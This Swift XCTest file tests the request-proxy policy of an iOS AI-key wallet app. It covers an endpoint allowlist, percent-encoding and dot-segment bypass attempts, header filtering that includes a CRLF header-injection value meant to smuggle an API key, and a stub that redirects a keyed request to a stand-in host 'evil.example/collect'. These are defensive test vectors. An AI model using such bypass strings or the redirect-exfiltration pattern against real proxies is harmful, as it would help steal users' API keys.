import XCTest
@testable import Byoky

/// What an approved app may send through the in-wallet browser: endpoints,
/// headers, body encodings, and that a redirect never carries a key away.
/// The endpoint vectors mirror `isAllowedProxyRequest` in core's
/// proxy-utils.test.ts; the extension, bridge and Android test the same.
final class ProxyPolicyTests: XCTestCase {

    // MARK: - Endpoints

    func testEndpointAllowlistMatchesCoreVectors() {
        let cases: [(String, String, Bool)] = [
            ("GET", "https://api.openai.com/v1/models", true),
            ("GET", "https://api.openai.com/v1/models/gpt-4o", true),
            ("GET", "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro", true),
            ("GET", "https://openrouter.ai/api/v1/models", true),
            ("GET", "http://localhost:11434/api/tags", true),
            ("GET", "http://localhost:11434/api/version", true),
            ("POST", "https://api.anthropic.com/v1/messages?beta=true", true),
            ("POST", "https://api.anthropic.com/v1/messages/count_tokens", true),
            ("POST", "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro:generateContent", true),
            ("POST", "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro:streamGenerateContent?alt=sse", true),
            ("POST", "https://api.groq.com/openai/v1/chat/completions", true),
            ("POST", "https://api.fireworks.ai/inference/v1/chat/completions", true),
            ("POST", "https://api.deepseek.com/chat/completions", true),
            ("POST", "https://api.openai.com/v1/responses", true),
            ("POST", "https://api.openai.com/v1/embeddings", true),
            ("POST", "https://api.openai.com/v1/audio/transcriptions", true),
            ("POST", "https://api.cohere.com/v2/chat", true),
            ("POST", "https://x.openai.azure.com/openai/deployments/gpt4/chat/completions?api-version=2024-10-21", true),
            ("POST", "http://localhost:11434/api/chat", true),
            ("POST", "http://localhost:11434/api/generate", true),
            ("POST", "https://api.anthropic.com/v1/messages/batches", false),
            ("GET", "https://api.anthropic.com/v1/messages/batches/b1/results", false),
            ("GET", "https://api.openai.com/v1/files", false),
            ("GET", "https://api.openai.com/v1/files/f1/content", false),
            ("POST", "https://api.openai.com/v1/fine_tuning/jobs", false),
            ("POST", "https://api.openai.com/v1/threads/t1/messages", false),
            ("GET", "https://api.openai.com/v1/responses/r1", false),
            ("GET", "https://api.openai.com/v1/chat/completions", false),
            ("DELETE", "https://api.openai.com/v1/models/ft-x", false),
            ("POST", "https://api.openai.com/v1/organization/admin_api_keys", false),
            ("POST", "https://generativelanguage.googleapis.com/upload/v1beta/files", false),
            ("POST", "https://generativelanguage.googleapis.com/v1beta/cachedContents", false),
            ("POST", "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro:tuneModel", false),
            ("POST", "https://openrouter.ai/api/v1/keys", false),
            ("POST", "https://api.openai.com/v1/foochat", false),
            ("PUT", "https://api.anthropic.com/v1/messages", false),
            ("POST", "not a url", false),
            ("POST", "https://api.openai.com/v1/%74hreads/t1/messages", false),
            ("GET", "https://api.openai.com/v1/fil%65s", false),
            ("POST", "https://api.openai.com/v1/%E0%A4%A/chat/completions", false),
            ("POST", "https://api.openai.com/v1/threads%2Ft1/messages", false),
            ("POST", "https://api.openai.com/v1/files%2Fx/chat/completions", false),
            ("POST", "https://api.openai.com/v1/x%5Cy/chat/completions", false),
            // Core answers true: WHATWG resolves %2E%2E before checking, and
            // fetch sends the resolved path. Foundation doesn't resolve it, so
            // iOS refuses (see testDotSegmentsAreRefused).
            ("POST", "https://api.openai.com/v1/%2E%2E/chat/completions", false),
        ]
        for (method, url, allowed) in cases {
            XCTAssertEqual(ProxyPolicy.isAllowedRequest(method: method, url: url), allowed, "\(method) \(url)")
        }
    }

    func testPathSegmentsCompareCaseInsensitively() {
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "get", url: "https://api.openai.com/V1/FILES"))
        XCTAssertTrue(ProxyPolicy.isAllowedRequest(method: "post", url: "https://api.openai.com/V1/Chat/Completions"))
        // Gemini action names after ":" are case-sensitive.
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://generativelanguage.googleapis.com/v1beta/models/g:generatecontent"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "GET", url: "https://generativelanguage.googleapis.com/v1beta/models/g:generateContent"))
    }

    func testSuffixesMatchWholeSegments() {
        XCTAssertTrue(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.example.com/foo/chat"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.example.com/foochat"))
        XCTAssertTrue(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/chat/completions/"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/chat/completionsx"))
        // The query never counts.
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/files?x=/chat/completions"))
    }

    /// Segments are percent-decoded (servers decode before routing); an
    /// encoded separator or a bad escape is refused.
    func testPathIsCheckedPercentDecoded() {
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/thre%61ds/t1/messages"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/chat%2Fcompletions"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/chat/completions;x"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/chat/completions%zz"))
        XCTAssertTrue(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/chat/%63ompletions"))
        XCTAssertTrue(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro%3AgenerateContent"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "GET", url: "https://generativelanguage.googleapis.com/v1beta/models/gemini%3AgenerateContent"))
    }

    /// iOS only, on inputs no SDK sends: Foundation keeps "." and ".."
    /// (WHATWG and OkHttp resolve them first) and the server would resolve
    /// them after the check; whitespace and control characters, which WHATWG
    /// strips, are encoded by Foundation instead. Both are refused.
    func testDotSegmentsAndWhitespaceAreRefused() {
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "GET", url: "https://api.openai.com/v1/responses/r1/models/.."))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "GET", url: "https://api.openai.com/v1/responses/r1/models/%2E%2E"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/./chat/completions"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/\tfiles/chat/completions"))
        XCTAssertFalse(ProxyPolicy.isAllowedRequest(method: "POST", url: "https://api.openai.com/v1/chat/completions\n"))
    }

    /// Mirrors the `shouldEstimateUsage` vectors in core's proxy-utils.test.ts.
    func testOnlyTextGenerationIsEstimated() {
        let cases: [(String, String, String, Bool)] = [
            ("openai", "https://api.openai.com/v1/chat/completions", "text/event-stream", true),
            ("anthropic", "https://api.anthropic.com/v1/messages", "application/json", true),
            ("gemini", "https://generativelanguage.googleapis.com/v1beta/models/g:streamGenerateContent?alt=sse", "text/event-stream", true),
            ("openai", "https://api.openai.com/v1/responses", "application/json; charset=utf-8", true),
            ("openai", "https://api.openai.com/v1/embeddings", "application/json", false),
            ("openai", "https://api.openai.com/v1/images/generations", "application/json", false),
            ("openai", "https://api.openai.com/v1/audio/speech", "audio/mpeg", false),
            ("openai", "https://api.openai.com/v1/chat/completions", "text/html", false),
            ("anthropic", "https://api.anthropic.com/v1/messages/count_tokens", "application/json", false),
            ("ollama", "http://localhost:11434/api/chat", "application/x-ndjson", false),
            ("lm_studio", "http://localhost:1234/v1/chat/completions", "application/json", false),
            ("gemini", "https://generativelanguage.googleapis.com/v1beta/models/g:countTokens", "application/json", false),
            ("gemini", "https://generativelanguage.googleapis.com/v1beta/models/g:generateContent", "application/json", true),
            ("openai", "https://api.openai.com/v1/models", "application/json", false),
        ]
        for (provider, url, type, expected) in cases {
            XCTAssertEqual(
                ProxyPolicy.shouldEstimateUsage(upstreamProviderId: provider, appUrl: url, contentType: type),
                expected, "\(provider) \(url) (\(type))"
            )
        }
    }

    // MARK: - Headers

    func testOnlyAllowlistedHeadersAreForwarded() {
        let forwarded = ProxyPolicy.forwardedHeaders([
            "Content-Type": "application/json",
            "Accept": "text/event-stream",
            "anthropic-version": "2023-06-01",
            "anthropic-beta": "tools-2024-04-04",
            "OpenAI-Organization": "org-1",
            "x-goog-api-client": "genai-js/1.0",
            "User-Agent": "app/1.0",
            "Authorization": "Bearer byk_session",
            "x-api-key": "byk_session",
            "api-key": "byk_session",
            "x-goog-api-key": "byk_session",
            "Cookie": "sid=1",
            "Host": "evil.example",
            "Origin": "https://app.example",
            "Referer": "https://app.example/",
            "Transfer-Encoding": "chunked",
            "Content-Length": "999",
            "Proxy-Authorization": "Basic x",
            "x-stainless-os": "MacOS",
            "sec-fetch-mode": "cors",
        ])
        XCTAssertEqual(forwarded, [
            "content-type": "application/json",
            "accept": "text/event-stream",
            "anthropic-version": "2023-06-01",
            "anthropic-beta": "tools-2024-04-04",
            "openai-organization": "org-1",
            "x-goog-api-client": "genai-js/1.0",
            "user-agent": "app/1.0",
        ])
    }

    func testHeaderValuesWithLineBreaksOrNulAreDropped() {
        let forwarded = ProxyPolicy.forwardedHeaders([
            "anthropic-beta": "a\r\nx-api-key: stolen",
            "accept": "text/plain\n",
            "user-agent": "ua\u{0}x",
            "content-type": "application/json",
        ])
        XCTAssertEqual(forwarded, ["content-type": "application/json"])
    }

    func testReroutedRequestsCanDropSourceDialectHeaders() {
        let forwarded = ProxyPolicy.forwardedHeaders(
            ["anthropic-version": "2023-06-01", "content-type": "application/json"],
            excluding: ["anthropic-version"]
        )
        XCTAssertEqual(forwarded, ["content-type": "application/json"])
    }

    // MARK: - Redirects

    func testRedirectsAreNotFollowed() async throws {
        RedirectStub.reset()
        let config = URLSessionConfiguration.ephemeral
        config.protocolClasses = [RedirectStub.self]
        let upstream = ProxyURLSession(configuration: config)
        defer { upstream.session.invalidateAndCancel() }

        var request = URLRequest(url: try XCTUnwrap(URL(string: "https://api.openai.com/v1/chat/completions")))
        request.httpMethod = "POST"
        request.setValue("sk-real-key", forHTTPHeaderField: "x-api-key")
        let (bytes, response) = try await upstream.bytes(for: request)
        var body = Data()
        for try await byte in bytes { body.append(byte) }

        XCTAssertEqual((response as? HTTPURLResponse)?.statusCode, 307)
        XCTAssertEqual(String(decoding: body, as: UTF8.self), "moved")
        XCTAssertEqual(RedirectStub.requestedHosts, ["api.openai.com"])
    }

    /// Control for the test above: the stub's redirect is followed by a
    /// session that allows it, so the test isn't passing vacuously.
    func testStubRedirectIsFollowedByDefault() async throws {
        RedirectStub.reset()
        let config = URLSessionConfiguration.ephemeral
        config.protocolClasses = [RedirectStub.self]
        let session = URLSession(configuration: config)
        defer { session.invalidateAndCancel() }

        let (data, response) = try await session.data(from: try XCTUnwrap(URL(string: "https://api.openai.com/v1/models")))
        XCTAssertEqual((response as? HTTPURLResponse)?.statusCode, 200)
        XCTAssertEqual(String(decoding: data, as: UTF8.self), "collected")
        XCTAssertEqual(RedirectStub.requestedHosts, ["api.openai.com", "evil.example"])
    }

    // MARK: - Body encodings

    func testTextAndBase64Bodies() throws {
        XCTAssertNil(try ProxyBody.decode(body: nil, encoding: nil))
        XCTAssertEqual(try ProxyBody.decode(body: "{\"a\":1}", encoding: nil), .text("{\"a\":1}"))
        XCTAssertEqual(try ProxyBody.decode(body: "plain", encoding: "something-new"), .text("plain"))

        let binary = try XCTUnwrap(try ProxyBody.decode(body: Data([0, 1, 2, 255]).base64EncodedString(), encoding: "base64"))
        XCTAssertEqual(binary, .binary(Data([0, 1, 2, 255])))
        XCTAssertNil(binary.asText)
        XCTAssertNil(binary.contentTypeOverride)
        XCTAssertThrowsError(try ProxyBody.decode(body: "not base64!", encoding: "base64"))
    }

    func testFormDataBecomesMultipart() throws {
        let audio = Data([0x49, 0x44, 0x33, 0x00, 0xFF])
        let serialized = """
        [{"name":"model","value":"whisper-1","type":"text"},\
        {"name":"file","value":"\(audio.base64EncodedString())","type":"file","filename":"a \\"b\\".mp3","contentType":"audio/mpeg"},\
        {"name":"blob","value":"","type":"file"}]
        """
        let body = try ProxyBody.multipart(fromSerialized: serialized, boundary: "XYZ")
        XCTAssertEqual(body.contentTypeOverride, "multipart/form-data; boundary=XYZ")

        var expected = Data()
        expected.append(Data("--XYZ\r\nContent-Disposition: form-data; name=\"model\"\r\n\r\nwhisper-1\r\n".utf8))
        expected.append(Data("--XYZ\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a %22b%22.mp3\"\r\nContent-Type: audio/mpeg\r\n\r\n".utf8))
        expected.append(audio)
        expected.append(Data("\r\n".utf8))
        expected.append(Data("--XYZ\r\nContent-Disposition: form-data; name=\"blob\"; filename=\"blob\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n".utf8))
        expected.append(Data("--XYZ--\r\n".utf8))
        XCTAssertEqual(body.data, expected)

        XCTAssertThrowsError(try ProxyBody.decode(body: "{not json", encoding: "formdata"))
        XCTAssertThrowsError(try ProxyBody.decode(body: #"[{"name":"f","value":"%%%","type":"file"}]"#, encoding: "formdata"))
    }
}

/// Answers api.openai.com with a 307 to evil.example (which answers 200),
/// and records every host it was asked for.
private final class RedirectStub: URLProtocol {
    private static let lock = NSLock()
    private static var hosts: [String] = []

    static var requestedHosts: [String] {
        lock.lock(); defer { lock.unlock() }
        return hosts
    }

    static func reset() {
        lock.lock(); defer { lock.unlock() }
        hosts = []
    }

    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        guard let url = request.url, let client else { return }
        Self.lock.lock()
        Self.hosts.append(url.host ?? "")
        Self.lock.unlock()

        if url.host == "api.openai.com", let target = URL(string: "https://evil.example/collect") {
            let response = HTTPURLResponse(url: url, statusCode: 307, httpVersion: "HTTP/1.1", headerFields: ["Location": target.absoluteString])!
            var redirect = URLRequest(url: target)
            redirect.httpMethod = request.httpMethod
            redirect.allHTTPHeaderFields = request.allHTTPHeaderFields
            client.urlProtocol(self, wasRedirectedTo: redirect, redirectResponse: response)
            // Reached only when the redirect is refused: the 3xx is the answer.
            client.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
            client.urlProtocol(self, didLoad: Data("moved".utf8))
            client.urlProtocolDidFinishLoading(self)
        } else {
            let response = HTTPURLResponse(url: url, statusCode: 200, httpVersion: "HTTP/1.1", headerFields: nil)!
            client.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
            client.urlProtocol(self, didLoad: Data("collected".utf8))
            client.urlProtocolDidFinishLoading(self)
        }
    }

    override func stopLoading() {}
}
